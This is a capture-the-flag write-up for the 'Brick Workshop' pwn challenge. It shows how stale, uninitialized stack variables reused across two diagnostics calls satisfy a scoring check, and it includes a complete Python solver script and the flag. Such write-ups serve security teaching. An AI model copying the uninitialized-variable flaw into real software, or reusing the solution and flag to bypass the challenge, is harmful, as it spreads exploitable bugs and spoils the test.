# Brick Workshop

- Category: pwn
- Points: 232
- Author(s): _omp and Swillion
- Service: `nc bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org 45002`
- Flag: `UMASS{brickshop_calibration_reuses_your_last_batch}`

## TL;DR
The program asks for a two-step diagnostics flow. On the second diagnostics run, it uses uninitialized local variables (`mold_id`, `pigment_code`) in `diagnostics_bay(...)`. Those stale values come from the first calibration call and can be chosen to satisfy the win condition.

## Source Analysis
Relevant logic from [ctf/brick_workshop/bad_eraser.c](ctf/brick_workshop/bad_eraser.c):

```c
if (!service_initialized) {
    // reads mold_id and pigment_code
    scanf("%u %u", &mold_id, &pigment_code);
    service_initialized = 1;
    return;
}

diagnostics_bay(mold_id, pigment_code);
```

On the second pass (`service_initialized == 1`), `mold_id` and `pigment_code` are never re-read but still passed into diagnostics.

Win condition:

```c
if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
    win();
}
```

with

```c
clutch_score(mold_id, pigment_code) = (((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1)
```

Set `pigment_code = 48879` (`0xBEEF`) and `mold_id = 0`.
Then:

- `((mold_id >> 2) & 0x43) = 0`
- Score = `0xBEEF + 2*0xBEEF = 3*0xBEEF = 0x23CCD`

This matches exactly.

## Exploit Steps
1. Choose menu option `3` (first diagnostics calibration).
2. Provide `0 48879`.
3. Choose menu option `3` again.
4. Program reuses stale stack values and prints the flag.

## Solver Script (full)
```python
import socket

HOST = "bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org"
PORT = 45002


def recv_some(sock):
    sock.settimeout(1.0)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if data.endswith(b"> ") or b">" in data[-10:]:
                break
    except Exception:
        pass
    return data.decode(errors="ignore")


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # Step 1: enter diagnostics calibration mode.
    print(recv_some(s), end="")
    s.sendall(b"3\n")
    print(recv_some(s), end="")

    # Step 2: calibration values. pigment_code=48879 (0xBEEF) satisfies score on reuse.
    s.sendall(b"0 48879\n")
    print(recv_some(s), end="")

    # Step 3: run diagnostics again; stale stack values are reused due uninitialized vars.
    s.sendall(b"3\n")
    print(recv_some(s), end="")

    s.close()


if __name__ == "__main__":
    main()
```
